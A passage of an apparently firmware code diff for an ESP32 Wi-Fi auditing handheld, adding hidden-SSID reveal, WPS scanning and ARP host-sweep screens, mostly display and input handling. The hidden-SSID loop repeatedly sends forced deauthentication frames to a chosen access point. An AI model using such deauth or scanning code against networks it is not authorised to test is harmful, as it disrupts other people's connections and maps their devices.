+      } else if (x >= 183 && x <= 240) {
+        drawButton(177, 304, 57, 16, "Back", true, false);
+        stopListening();
+        s_selectedIndex = -1;
+        s_listenAll = false;
+        s_revealUiDrawn = false;
+        drawScanScreen(true);
+        updateNavLabels(false);
+        lastTouchActionMs = now;
+        redraw = true;
+      }
+    }
+  }
+
+  if (redraw) {
+    delay(50);
+  }
+}
+
+static void runUI() {
+  static int iconX[ICON_NUM] = {220, 10};
+  static int iconY = STATUS_BAR_Y_OFFSET;
+  static const unsigned char* icons[ICON_NUM] = {
+      bitmap_icon_undo,
+      bitmap_icon_go_back};
+
+  if (!s_uiDrawn) {
+    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
+    for (int i = 0; i < ICON_NUM; i++) {
+      if (icons[i] != NULL) {
+        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
+      }
+    }
+    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
+    s_uiDrawn = true;
+  }
+
+  static unsigned long lastAnimationTime = 0;
+  static int animationState = 0;
+  static int activeIcon = -1;
+
+  switch (animationState) {
+    case 0:
+      break;
+    case 1:
+      if (millis() - lastAnimationTime >= 150) {
+        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
+        animationState = 2;
+        lastAnimationTime = millis();
+      }
+      break;
+    case 2:
+      if (millis() - lastAnimationTime >= 200) {
+        animationState = 3;
+        lastAnimationTime = millis();
+      }
+      break;
+    case 3:
+      if (activeIcon == 0) {
+        stopListening();
+        s_selectedIndex = -1;
+        s_listenAll = false;
+        s_revealUiDrawn = false;
+        scanHiddenNetworks();
+        drawScanScreen(true);
+        updateNavLabels(false);
+      }
+      animationState = 0;
+      activeIcon = -1;
+      break;
+  }
+
+  static unsigned long lastTouchCheck = 0;
+  if (millis() - lastTouchCheck >= 50) {
+    int x, y;
+    if (feature_active && readTouchXY(x, y)) {
+      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
+        for (int i = 0; i < ICON_NUM; i++) {
+          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
+            if (icons[i] != NULL && animationState == 0) {
+              if (i == 1) {
+                feature_exit_requested = true;
+              } else {
+                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
+                animationState = 1;
+                activeIcon = i;
+                lastAnimationTime = millis();
+              }
+            }
+            break;
+          }
+        }
+      }
+    }
+    lastTouchCheck = millis();
+  }
+}
+
+static void hopChannelsIfNeeded() {
+  if (!s_listening || !s_listenAll || s_count <= 1) {
+    return;
+  }
+  if (millis() - s_lastHopMs < LISTEN_HOP_MS) {
+    return;
+  }
+  s_lastHopMs = millis();
+  s_hopPos = (s_hopPos + 1) % s_count;
+  uint8_t ch = s_aps[s_hopPos].channel;
+  if (ch < 1 || ch > 14) {
+    ch = 1;
+  }
+  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+}
+
+static void teardown() {
+  stopListening();
+  WiFi.scanDelete();
+  WiFi.disconnect(true, true);
+  s_selectedIndex = -1;
+  s_listenAll = false;
+  s_scanning = false;
+  s_revealPending = false;
+}
+
+void hiddenSsidSetup() {
+  pauseBackgroundRadioTasks();
+  setTouchButtonInputEnabled(true);
+  updateNavLabels(false);
+  featureClearContent(TFT_BLACK);
+
+  setupTouchscreen();
+  s_uiDrawn = false;
+  s_count = 0;
+  s_currentIndex = 0;
+  s_currentPage = 0;
+  s_selectedIndex = -1;
+  s_listenAll = false;
+  s_listening = false;
+  s_forcing = false;
+  s_scanning = false;
+  s_mgmtFrames = 0;
+  s_ssidHits = 0;
+  s_deauthSent = 0;
+  s_revealPending = false;
+
+  float currentBatteryVoltage = readBatteryVoltage();
+  drawStatusBar(currentBatteryVoltage, true);
+  redrawTouchButtonBar();
+  runUI();
+
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+  tft.setTextColor(GREEN, BLACK);
+  tft.setTextSize(1);
+  tft.setCursor(10, 50);
+  tft.println("Initializing...");
+
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  delay(50);
+
+  scanHiddenNetworks();
+  drawScanScreen();
+  redrawTouchButtonBar();
+}
+
+void hiddenSsidLoop() {
+  if (feature_exit_requested) {
+    teardown();
+    return;
+  }
+
+  if (feature_active && (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
+    teardown();
+    feature_exit_requested = true;
+    return;
+  }
+
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+
+  handleNavButtons();
+  handleTouch();
+  flushPendingReveal();
+  hopChannelsIfNeeded();
+  updateStatusBar();
+  runUI();
+  maintainTouchNavBar();
+
+  if (feature_exit_requested) {
+    teardown();
+    return;
+  }
+
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+
+  const bool onReveal = (s_selectedIndex >= 0 || s_listenAll);
+  const uint32_t now = millis();
+
+  if (onReveal && s_forcing && s_listening && s_selectedIndex >= 0 &&
+      s_selectedIndex < s_count) {
+    if (now - s_lastDeauthMs >= DEAUTH_INTERVAL_MS) {
+      sendForceDeauth(s_aps[s_selectedIndex].bssid, s_aps[s_selectedIndex].channel);
+      s_lastDeauthMs = now;
+    }
+  }
+
+  if (onReveal && s_listening) {
+    if (now - s_lastStatusMs > 500) {
+      updateRevealStats();
+      s_lastStatusMs = now;
+    }
+  }
+}
+
+}  // namespace HiddenSsidReveal
+
+
+namespace WpsScanner {
+
+#define SCREEN_WIDTH 240
+#define STATUS_BAR_Y_OFFSET 20
+#define STATUS_BAR_HEIGHT 16
+#define ICON_SIZE 16
+#define ICON_NUM 2
+
+static constexpr int LIST_HEADER_Y = 50;
+static constexpr int LIST_FIRST_ROW_Y = LIST_HEADER_Y + 20;
+static constexpr int LIST_ROW_H = 22;
+static constexpr int MAX_WPS_APS = 48;
+static constexpr unsigned long BTN_DEBOUNCE_MS = 200;
+
+struct WpsAp {
+  char ssid[33];
+  uint8_t bssid[6];
+  int8_t rssi;
+  uint8_t channel;
+  wifi_auth_mode_t authmode;
+};
+
+static WpsAp s_aps[MAX_WPS_APS];
+static int s_count = 0;
+static int s_currentIndex = 0;
+static int s_currentPage = 0;
+static bool s_scanning = false;
+static bool s_uiDrawn = false;
+static unsigned long s_lastBtnMs = 0;
+static int s_lastRenderedIndex = -1;
+static int s_lastRenderedPage = -1;
+
+static void drawScanScreen(bool fullRedraw);
+static void updateNavLabels();
+static void runScan();
+
+static int networksPerPage() {
+  return max(1, (wifiListBottomY() - LIST_FIRST_ROW_Y) / LIST_ROW_H);
+}
+
+static void updateNavLabels() {
+  if (!featureHasTouchNavBar()) {
+    return;
+  }
+  setTouchNavLabels("Rescan", "Next", "Exit", "Prev", nullptr);
+  redrawTouchButtonBar();
+}
+
+static void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
+  FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
+                                           : FeatureUI::ButtonStyle::Secondary;
+  FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
+}
+
+static void drawTabBar(const char* leftButton, bool leftDisabled,
+                       const char* prevButton, bool prevDisabled,
+                       const char* nextButton, bool nextDisabled) {
+  if (featureHasTouchNavBar()) {
+    updateNavLabels();
+    return;
+  }
+  tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);
+  if (leftButton && leftButton[0]) {
+    drawButton(0, 304, 57, 16, leftButton, false, leftDisabled);
+  }
+  if (prevButton && prevButton[0]) {
+    drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
+  }
+  if (nextButton && nextButton[0]) {
+    drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
+  }
+}
+
+static int compareWpsAp(const void* a, const void* b) {
+  const WpsAp* ap1 = (const WpsAp*)a;
+  const WpsAp* ap2 = (const WpsAp*)b;
+  return (int)ap2->rssi - (int)ap1->rssi;
+}
+
+static const char* authShort(wifi_auth_mode_t mode) {
+  switch (mode) {
+    case WIFI_AUTH_OPEN: return "OPEN";
+    case WIFI_AUTH_WEP: return "WEP";
+    case WIFI_AUTH_WPA_PSK: return "WPA";
+    case WIFI_AUTH_WPA2_PSK: return "WPA2";
+    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA*";
+    case WIFI_AUTH_WPA2_ENTERPRISE: return "ENT";
+    case WIFI_AUTH_WPA3_PSK: return "WPA3";
+    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA3*";
+    default: return "?";
+  }
+}
+
+static void truncCopy(char* dst, size_t dstSz, const char* src, size_t maxChars) {
+  if (!dst || dstSz == 0) {
+    return;
+  }
+  if (!src) {
+    dst[0] = '\0';
+    return;
+  }
+  size_t n = strlen(src);
+  if (n > maxChars) {
+    n = maxChars;
+  }
+  if (n >= dstSz) {
+    n = dstSz - 1;
+  }
+  memcpy(dst, src, n);
+  dst[n] = '\0';
+}
+
+static void drawApRow(int i, int y, bool isSel) {
+  char buf[64];
+  char name[16];
+  if (s_aps[i].ssid[0]) {
+    truncCopy(name, sizeof(name), s_aps[i].ssid, 11);
+    if (strlen(s_aps[i].ssid) > 11) {
+      strcat(name, "...");
+    }
+  } else {
+    snprintf(name, sizeof(name), "(hidden)");
+  }
+
+  snprintf(buf, sizeof(buf), "%02d: %-14s %3d Ch%2d %s",
+           i + 1, name, (int)s_aps[i].rssi, (int)s_aps[i].channel,
+           authShort(s_aps[i].authmode));
+
+  tft.fillRect(0, y, SCREEN_WIDTH, LIST_ROW_H, TFT_BLACK);
+  tft.setCursor(2, y);
+  tft.setTextColor(isSel ? ORANGE : FEATURE_BG);
+  tft.print(isSel ? ">" : " ");
+  tft.setCursor(10, y);
+  tft.setTextColor(isSel ? ORANGE : WHITE);
+  tft.println(buf);
+}
+
+static void displayScanning() {
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+  wifiClearBody(TFT_BLACK);
+  s_lastRenderedIndex = -1;
+  s_lastRenderedPage = -1;
+  tft.setTextSize(1);
+  tft.setTextColor(GREEN);
+  tft.setCursor(10, 50);
+  tft.println("Scanning.");
+  loading(100, ORANGE, 0, 0, 3, true);
+  tft.setCursor(10, 65);
+  tft.println("Looking for WPS APs.");
+}
+
+static void drawScanScreen(bool fullRedraw) {
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+  tft.setTextSize(1);
+
+  if (s_scanning) {
+    displayScanning();
+    return;
+  }
+
+  if (s_count == 0) {
+    wifiClearBody(TFT_BLACK);
+    s_lastRenderedIndex = -1;
+    s_lastRenderedPage = -1;
+    tft.setTextColor(GREEN);
+    tft.setCursor(10, 50);
+    tft.println("No WPS networks found.");
+    tft.setCursor(10, 65);
+    tft.println("Press Rescan.");
+    drawTabBar("Rescan", false, "Prev", true, "Next", true);
+    return;
+  }
+
+  const int perPage = networksPerPage();
+  if (s_currentIndex < 0) {
+    s_currentIndex = 0;
+  }
+  if (s_currentIndex >= s_count) {
+    s_currentIndex = max(0, s_count - 1);
+  }
+  s_currentPage = s_currentIndex / max(1, perPage);
+
+  const bool pageChanged = (s_currentPage != s_lastRenderedPage);
+  const bool needFull = fullRedraw || pageChanged || (s_lastRenderedIndex < 0);
+
+  if (!needFull && s_lastRenderedIndex != s_currentIndex) {
+    const int prev = s_lastRenderedIndex;
+    const int now = s_currentIndex;
+    const int start = s_currentPage * perPage;
+    if (prev >= start && prev < start + perPage) {
+      drawApRow(prev, LIST_FIRST_ROW_Y + (prev - start) * LIST_ROW_H, false);
+    }
+    if (now >= start && now < start + perPage) {
+      drawApRow(now, LIST_FIRST_ROW_Y + (now - start) * LIST_ROW_H, true);
+    }
+    s_lastRenderedIndex = s_currentIndex;
+    return;
+  }
+
+  if (!needFull) {
+    return;
+  }
+
+  wifiClearBody(TFT_BLACK);
+
+  tft.setTextColor(GREEN);
+  tft.setCursor(10, LIST_HEADER_Y);
+  tft.println("WPS Networks:");
+
+  char page_buf[20];
+  snprintf(page_buf, sizeof(page_buf), "Page %d/%d",
+           s_currentPage + 1, max(1, (s_count + perPage - 1) / perPage));
+  tft.setCursor(180, LIST_HEADER_Y);
+  tft.setTextColor(GREEN);
+  tft.println(page_buf);
+
+  int y = LIST_FIRST_ROW_Y;
+  const int start_index = s_currentPage * perPage;
+  const int end_index = min(start_index + perPage, s_count);
+  for (int i = start_index; i < end_index && y < wifiListBottomY(); i++) {
+    drawApRow(i, y, i == s_currentIndex);
+    y += LIST_ROW_H;
+  }
+
+  drawTabBar("Rescan", false, "Prev", s_currentIndex <= 0, "Next",
+             s_currentIndex >= s_count - 1);
+  s_lastRenderedIndex = s_currentIndex;
+  s_lastRenderedPage = s_currentPage;
+}
+
+static void runScan() {
+  s_scanning = true;
+  s_count = 0;
+  s_currentIndex = 0;
+  s_currentPage = 0;
+  s_lastRenderedPage = -1;
+  displayScanning();
+  updateNavLabels();
+
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect(true, true);
+  delay(40);
+  WiFi.scanDelete();
+
+  const uint32_t dwell = wifiStaScanMsPerChannel();
+  const int n = WiFi.scanNetworks(false, true, false, dwell);
+
+  if (n > 0) {
+    uint16_t apNum = (uint16_t)n;
+    wifi_ap_record_t* rec =
+        (wifi_ap_record_t*)malloc(sizeof(wifi_ap_record_t) * apNum);
+    if (rec) {
+      if (esp_wifi_scan_get_ap_records(&apNum, rec) == ESP_OK) {
+        for (uint16_t i = 0; i < apNum && s_count < MAX_WPS_APS; i++) {
+          if (!rec[i].wps) {
+            continue;
+          }
+          WpsAp& e = s_aps[s_count];
+          truncCopy(e.ssid, sizeof(e.ssid), (const char*)rec[i].ssid, 32);
+          memcpy(e.bssid, rec[i].bssid, 6);
+          e.rssi = rec[i].rssi;
+          e.channel = rec[i].primary;
+          e.authmode = rec[i].authmode;
+          s_count++;
+        }
+      }
+      free(rec);
+    }
+  }
+
+  if (s_count > 1) {
+    qsort(s_aps, s_count, sizeof(WpsAp), compareWpsAp);
+  }
+
+  WiFi.scanDelete();
+  s_scanning = false;
+  s_lastRenderedPage = -1;
+  drawScanScreen(true);
+  updateNavLabels();
+}
+
+static void handleNavButtons() {
+  const unsigned long now = millis();
+  if (now - s_lastBtnMs < BTN_DEBOUNCE_MS) {
+    (void)isButtonPressedEdge(BTN_LEFT);
+    (void)isButtonPressedEdge(BTN_RIGHT);
+    (void)isButtonPressedEdge(BTN_UP);
+    (void)isButtonPressedEdge(BTN_DOWN);
+    return;
+  }
+
+  if (isButtonPressedEdge(BTN_LEFT)) {
+    runScan();
+    s_lastBtnMs = now;
+    return;
+  }
+
+  const int perPage = networksPerPage();
+  if (isButtonPressedEdge(BTN_DOWN)) {
+    if (s_count > 0) {
+      s_currentIndex = (s_currentIndex + 1) % s_count;
+      drawScanScreen(false);
+    }
+    s_lastBtnMs = now;
+    return;
+  }
+  if (isButtonPressedEdge(BTN_UP)) {
+    if (s_count > 0) {
+      s_currentIndex = (s_currentIndex - 1 + s_count) % s_count;
+      drawScanScreen(false);
+    }
+    s_lastBtnMs = now;
+    return;
+  }
+  if (isButtonPressedEdge(BTN_RIGHT)) {
+    if (s_count > perPage) {
+      const int pages = (s_count + perPage - 1) / perPage;
+      s_currentPage = (s_currentPage + 1) % pages;
+      s_currentIndex = s_currentPage * perPage;
+      drawScanScreen(true);
+    }
+    s_lastBtnMs = now;
+    return;
+  }
+}
+
+static void handleTouch() {
+  int x, y;
+  if (!feature_active || !readTouchXY(x, y)) {
+    return;
+  }
+
+  const int perPage = networksPerPage();
+  if (y >= LIST_FIRST_ROW_Y && y < wifiListBottomY() && s_count > 0) {
+    const int row = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H;
+    const int idx = s_currentPage * perPage + row;
+    if (row >= 0 && row < perPage && idx < s_count) {
+      s_currentIndex = idx;
+      drawScanScreen(false);
+      delay(120);
+    }
+  }
+}
+
+static void runUI() {
+  static int iconX[ICON_NUM] = {220, 10};
+  static int iconY = STATUS_BAR_Y_OFFSET;
+  static const unsigned char* icons[ICON_NUM] = {
+      bitmap_icon_undo,
+      bitmap_icon_go_back};
+
+  if (!s_uiDrawn) {
+    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
+    for (int i = 0; i < ICON_NUM; i++) {
+      if (icons[i] != NULL) {
+        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
+      }
+    }
+    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
+    s_uiDrawn = true;
+  }
+
+  static unsigned long lastAnimationTime = 0;
+  static int animationState = 0;
+  static int activeIcon = -1;
+
+  switch (animationState) {
+    case 0:
+      break;
+    case 1:
+      if (millis() - lastAnimationTime >= 150) {
+        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
+        animationState = 2;
+        lastAnimationTime = millis();
+      }
+      break;
+    case 2:
+      if (millis() - lastAnimationTime >= 200) {
+        animationState = 3;
+        lastAnimationTime = millis();
+      }
+      break;
+    case 3:
+      if (activeIcon == 0) {
+        runScan();
+      }
+      animationState = 0;
+      activeIcon = -1;
+      break;
+  }
+
+  static unsigned long lastTouchCheck = 0;
+  if (millis() - lastTouchCheck >= 50) {
+    int x, y;
+    if (feature_active && readTouchXY(x, y)) {
+      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
+        for (int i = 0; i < ICON_NUM; i++) {
+          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
+            if (icons[i] != NULL && animationState == 0) {
+              if (i == 1) {
+                feature_exit_requested = true;
+              } else {
+                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
+                animationState = 1;
+                activeIcon = i;
+                lastAnimationTime = millis();
+              }
+            }
+            break;
+          }
+        }
+      }
+    }
+    lastTouchCheck = millis();
+  }
+}
+
+static void teardown() {
+  WiFi.scanDelete();
+  WiFi.disconnect(true, true);
+  s_scanning = false;
+}
+
+void wpsScannerSetup() {
+  pauseBackgroundRadioTasks();
+  setTouchButtonInputEnabled(true);
+  featureClearContent(TFT_BLACK);
+
+  setupTouchscreen();
+  s_uiDrawn = false;
+  s_count = 0;
+  s_currentIndex = 0;
+  s_currentPage = 0;
+  s_scanning = false;
+  s_lastRenderedIndex = -1;
+  s_lastRenderedPage = -1;
+
+  float v = readBatteryVoltage();
+  drawStatusBar(v, true);
+  redrawTouchButtonBar();
+  runUI();
+  updateNavLabels();
+
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+  runScan();
+}
+
+void wpsScannerLoop() {
+  if (feature_exit_requested) {
+    teardown();
+    return;
+  }
+  if (feature_active && (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
+    teardown();
+    feature_exit_requested = true;
+    return;
+  }
+
+  handleNavButtons();
+  handleTouch();
+  updateStatusBar();
+  runUI();
+  maintainTouchNavBar();
+
+  if (feature_exit_requested) {
+    teardown();
+  }
+}
+
+}  // namespace WpsScanner
+
+
+namespace ArpScanner {
+
+#define SCREEN_WIDTH 240
+#define STATUS_BAR_Y_OFFSET 20
+#define STATUS_BAR_HEIGHT 16
+#define ICON_SIZE 16
+#define ICON_NUM 2
+
+static constexpr int LIST_HEADER_Y = 50;
+static constexpr int LIST_FIRST_ROW_Y = LIST_HEADER_Y + 20;
+static constexpr int LIST_ROW_H = 22;
+static constexpr int MAX_APS = 40;
+static constexpr int MAX_HOSTS = 64;
+static constexpr unsigned long BTN_DEBOUNCE_MS = 200;
+static constexpr uint32_t CONNECT_TIMEOUT_MS = 15000;
+static constexpr int ARP_BATCH = 8;
+static constexpr int ARP_BATCH_WAIT_MS = 80;
+static constexpr int ARP_MAX_HOSTS_SWEEP = 254;
+
+enum class Phase : uint8_t {
+  ApList = 0,
+  Hosts
+};
+
+struct ApEntry {
+  char ssid[33];
+  uint8_t bssid[6];
+  int8_t rssi;
+  uint8_t channel;
+  wifi_auth_mode_t authmode;
+};
+
+struct HostEntry {
+  uint32_t ip;  // same packing as IPAddress uint32_t
+  uint8_t mac[6];
+};
+
+static ApEntry s_aps[MAX_APS];
+static int s_apCount = 0;
+static HostEntry s_hosts[MAX_HOSTS];
+static int s_hostCount = 0;
+
+static Phase s_phase = Phase::ApList;
+static int s_currentIndex = 0;
+static int s_currentPage = 0;
+static bool s_scanning = false;
+static bool s_uiDrawn = false;
+static unsigned long s_lastBtnMs = 0;
+static int s_lastRenderedIndex = -1;
+static int s_lastRenderedPage = -1;
+static char s_joinedSsid[33] = {0};
+
+static void drawScreen(bool fullRedraw);
+static void updateNavLabels();
+static void scanAccessPoints();
+static void joinSelectedAp();
+static void runArpSweep();
+static void disconnectSta();
+
+static int networksPerPage() {
+  return max(1, (wifiListBottomY() - LIST_FIRST_ROW_Y) / LIST_ROW_H);
+}
+
+static void updateNavLabels() {
+  if (!featureHasTouchNavBar()) {
+    return;
+  }
+  if (s_phase == Phase::ApList) {
+    setTouchNavLabels("Rescan", "Next", "Exit", "Prev", "Join");
+  } else {
+    setTouchNavLabels("Rescan", "Next", "Exit", "Prev", "Back");
+  }
+  redrawTouchButtonBar();
+}
+
+static void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
+  FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
+                                           : FeatureUI::ButtonStyle::Secondary;
+  FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
+}
+
+static void drawTabBar(const char* leftButton, bool leftDisabled,
+                       const char* prevButton, bool prevDisabled,
+                       const char* nextButton, bool nextDisabled) {
+  if (featureHasTouchNavBar()) {
+    updateNavLabels();
+    return;
+  }
+  tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);
+  if (leftButton && leftButton[0]) {
+    drawButton(0, 304, 57, 16, leftButton, false, leftDisabled);
+  }
+  if (prevButton && prevButton[0]) {
+    drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
+  }
+  if (nextButton && nextButton[0]) {
+    drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
+  }
+}
+
+static int compareApRssi(const void* a, const void* b) {
+  const ApEntry* ap1 = (const ApEntry*)a;
+  const ApEntry* ap2 = (const ApEntry*)b;
+  return (int)ap2->rssi - (int)ap1->rssi;
+}
+
+static int compareHostIp(const void* a, const void* b) {
+  const HostEntry* h1 = (const HostEntry*)a;
+  const HostEntry* h2 = (const HostEntry*)b;
+  if (h1->ip < h2->ip) return -1;
+  if (h1->ip > h2->ip) return 1;
+  return 0;
+}
+
+static const char* authShort(wifi_auth_mode_t mode) {
+  switch (mode) {
+    case WIFI_AUTH_OPEN: return "OPEN";
+    case WIFI_AUTH_WEP: return "WEP";
+    case WIFI_AUTH_WPA_PSK: return "WPA";
+    case WIFI_AUTH_WPA2_PSK: return "WPA2";
+    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA*";
+    case WIFI_AUTH_WPA2_ENTERPRISE: return "ENT";
+    case WIFI_AUTH_WPA3_PSK: return "WPA3";
+    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA3*";
+    default: return "?";
+  }
+}
+
+static void truncCopy(char* dst, size_t dstSz, const char* src, size_t maxChars) {
+  if (!dst || dstSz == 0) {
+    return;
+  }
+  if (!src) {
+    dst[0] = '\0';
+    return;
+  }
+  size_t n = strlen(src);
+  if (n > maxChars) {
+    n = maxChars;
+  }
+  if (n >= dstSz) {
+    n = dstSz - 1;
+  }
+  memcpy(dst, src, n);
+  dst[n] = '\0';
+}
+
+static struct netif* staNetif() {
+  if (netif_default && netif_is_up(netif_default) &&
+      !ip4_addr_isany_val(*netif_ip4_addr(netif_default))) {
+    return netif_default;
+  }
+  for (struct netif* n = netif_list; n != nullptr; n = n->next) {
+    if (netif_is_up(n) && !ip4_addr_isany_val(*netif_ip4_addr(n))) {
+      return n;
+    }
+  }
+  return netif_default;
+}
+
+static void displayBusy(const char* line1, const char* line2) {
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+  wifiClearBody(TFT_BLACK);
+  s_lastRenderedIndex = -1;
+  s_lastRenderedPage = -1;
+  tft.setTextSize(1);
+  tft.setTextColor(GREEN, TFT_BLACK);
+  tft.setCursor(10, 50);
+  tft.println(line1);
+  if (line2 && line2[0]) {
+    tft.setTextColor(GREEN, TFT_BLACK);
+    tft.setCursor(10, 65);
+    tft.println(line2);
+  }
+}
+
+static void displayBusyWithLoading(const char* line1, const char* line2) {
+  displayBusy(line1, line2);
+  loading(100, ORANGE, 0, 0, 3, true);
+  // Restore the status lines after the centered loading bitmap.
+  tft.setTextSize(1);
+  tft.setTextColor(GREEN, TFT_BLACK);
+  tft.setCursor(10, 50);
+  tft.println(line1);
+  if (line2 && line2[0]) {
+    tft.setCursor(10, 65);
+    tft.println(line2);
+  }
+}
+
+static constexpr int COL_LEFT_X = 10;
+static constexpr int COL_RIGHT_MARGIN = 4;
+
+static void drawApRow(int i, int y, bool isSel) {
+  char name[16];
+  if (s_aps[i].ssid[0]) {
+    truncCopy(name, sizeof(name), s_aps[i].ssid, 11);
+    if (strlen(s_aps[i].ssid) > 11) {
+      strcat(name, "...");
+    }
+  } else {
+    snprintf(name, sizeof(name), "(hidden)");
+  }
+
+  char left[28];
+  snprintf(left, sizeof(left), "%02d: %s", i + 1, name);
+
+  char right[28];
+  snprintf(right, sizeof(right), "%d  Ch%u  %s",
+           (int)s_aps[i].rssi, (unsigned)s_aps[i].channel,
+           authShort(s_aps[i].authmode));
+
+  tft.fillRect(0, y, SCREEN_WIDTH, LIST_ROW_H, TFT_BLACK);
+  tft.setCursor(2, y);
+  tft.setTextColor(isSel ? ORANGE : FEATURE_BG, TFT_BLACK);
+  tft.print(isSel ? ">" : " ");
+
+  const bool openNet = (s_aps[i].authmode == WIFI_AUTH_OPEN);
+  const uint16_t fg = isSel ? ORANGE : (openNet ? ORANGE : WHITE);
+  const int rightW = tft.textWidth(right);
+  const int rightX = SCREEN_WIDTH - COL_RIGHT_MARGIN - rightW;
+
+  tft.setTextColor(fg, TFT_BLACK);
+  tft.setCursor(COL_LEFT_X, y);
+  tft.print(left);
+
+  tft.setCursor(rightX, y);
+  tft.print(right);
+}
+
+static void drawHostRow(int i, int y, bool isSel) {
+  char left[28];
+  IPAddress ip(s_hosts[i].ip);
+  snprintf(left, sizeof(left), "%02d: %d.%d.%d.%d",
+           i + 1, ip[0], ip[1], ip[2], ip[3]);
+
+  char mac[18];
+  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
+           s_hosts[i].mac[0], s_hosts[i].mac[1], s_hosts[i].mac[2],
+           s_hosts[i].mac[3], s_hosts[i].mac[4], s_hosts[i].mac[5]);
+
+  tft.fillRect(0, y, SCREEN_WIDTH, LIST_ROW_H, TFT_BLACK);
+  tft.setCursor(2, y);
+  tft.setTextColor(isSel ? ORANGE : FEATURE_BG, TFT_BLACK);
+  tft.print(isSel ? ">" : " ");
+
+  const int macW = tft.textWidth(mac);
+  const int macX = SCREEN_WIDTH - COL_RIGHT_MARGIN - macW;
+
+  tft.setTextColor(isSel ? ORANGE : WHITE, TFT_BLACK);
+  tft.setCursor(COL_LEFT_X, y);
+  tft.print(left);
+
+  tft.setTextColor(isSel ? ORANGE : UI_DIM_TEXT, TFT_BLACK);
+  tft.setCursor(macX, y);
+  tft.print(mac);
+}
+
+static void drawListCommon(bool fullRedraw, int count, const char* header,
+                           void (*drawRow)(int, int, bool)) {
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+  tft.setTextSize(1);
+
+  if (s_scanning) {
+    return;
+  }
+
+  if (count == 0) {
+    wifiClearBody(TFT_BLACK);
+    s_lastRenderedIndex = -1;
+    s_lastRenderedPage = -1;
+    tft.setTextColor(GREEN);
+    tft.setCursor(10, 50);
+    if (s_phase == Phase::ApList) {
+      tft.println("No networks found.");
+    } else {
+      tft.println("No hosts found.");
+    }
+    tft.setCursor(10, 65);
+    tft.println("Press Rescan.");
+    drawTabBar("Rescan", false, "Prev", true, "Next", true);
+    return;
+  }
+
+  const int perPage = networksPerPage();
+  if (s_currentIndex < 0) {
+    s_currentIndex = 0;
+  }
+  if (s_currentIndex >= count) {
+    s_currentIndex = max(0, count - 1);
+  }
+  s_currentPage = s_currentIndex / max(1, perPage);
+
+  const bool pageChanged = (s_currentPage != s_lastRenderedPage);
+  const bool needFull = fullRedraw || pageChanged || (s_lastRenderedIndex < 0);
+
+  if (!needFull && s_lastRenderedIndex != s_currentIndex) {
+    const int prev = s_lastRenderedIndex;
+    const int now = s_currentIndex;
+    const int start = s_currentPage * perPage;
+    if (prev >= start && prev < start + perPage) {
+      drawRow(prev, LIST_FIRST_ROW_Y + (prev - start) * LIST_ROW_H, false);
+    }
+    if (now >= start && now < start + perPage) {
+      drawRow(now, LIST_FIRST_ROW_Y + (now - start) * LIST_ROW_H, true);
+    }
+    s_lastRenderedIndex = s_currentIndex;
+    return;
+  }
+
+  if (!needFull) {
+    return;
+  }
+
+  wifiClearBody(TFT_BLACK);
+
+  tft.setTextColor(GREEN);
+  tft.setCursor(10, LIST_HEADER_Y);
+  tft.println(header);
+
+  char page_buf[20];
+  snprintf(page_buf, sizeof(page_buf), "Page %d/%d",
+           s_currentPage + 1, max(1, (count + perPage - 1) / perPage));
+  tft.setCursor(180, LIST_HEADER_Y);
+  tft.setTextColor(GREEN);
